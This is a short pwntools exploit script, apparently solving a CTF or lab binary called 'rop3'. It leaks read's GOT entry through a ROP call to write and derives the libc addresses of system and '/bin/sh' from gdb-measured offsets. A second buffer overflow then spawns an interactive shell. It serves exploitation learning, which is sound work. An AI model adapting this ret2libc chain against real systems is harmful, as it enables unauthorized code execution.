#this was done with debugger gdb
# gdb-peda plugin used

from pwn import *
context(arch="i686", os="linux")
leak = "A"*140
# ssize_t write(int fd, const void *buf, size_t count);
#return addr 0x8048380 write@plt
leak += "\x80\x83\x04\x08"
#return address of vulnerable func #0x080484ab
leak += "\xab\x84\x04\x08"
#this used for testing
#leak += "BBBB"
#file descriptor stdount -1
leak += "\x01\x00\x00\x00"
#return addr 0804a00c read@GOT
leak += "\x0c\xa0\x04\x08"
# size, 4 bytes
leak += "\x04\x00\x00\x00"
print(leak)
exploit = process("./rop3", shell=True)

exploit.sendline(leak)
read_addr = unpack(exploit.recv(4))
print hex(read_addr)

#check if we can read same address 2 times
exploit.sendline(leak)
read_addr2 = unpack(exploit.recv(4))
print hex(read_addr2)

# p read -> $1 = {<text variable, no debug info>} 0xb7eefb00 <read>
# p system -> $2 = {<text variable, no debug info>} 0xb7e54da0 <__libc_system>
# find "/bin" -> libc : 0xb7f75a0b ("/bin/sh")
# p exit -> $3 = {<text variable, no debug info>} 0xb7e489d0 <__GI_exit>

# p 0xb7eefb00 - 0xb7e54da0
# p read - p system = 0x9ad60
system_addr = read_addr - 0x9ad60

# p 0xb7f75a0b - 0xb7eefb00
# p (find "/bin") - p read = 0x85f0b
binsh_addr = read_addr + 0x85f0b

#p 0xb7eefb00 - 0xb7e489d0
#p read - p exit = 0xa7130
exit_addr = read_addr -  0xa7130

print("system: %s " % hex(system_addr))
print("binsh: %s " % hex(binsh_addr))

shell = "A"*140 + pack(system_addr) + pack(exit_addr) + pack(binsh_addr)
exploit.sendline(shell)
exploit.interactive()
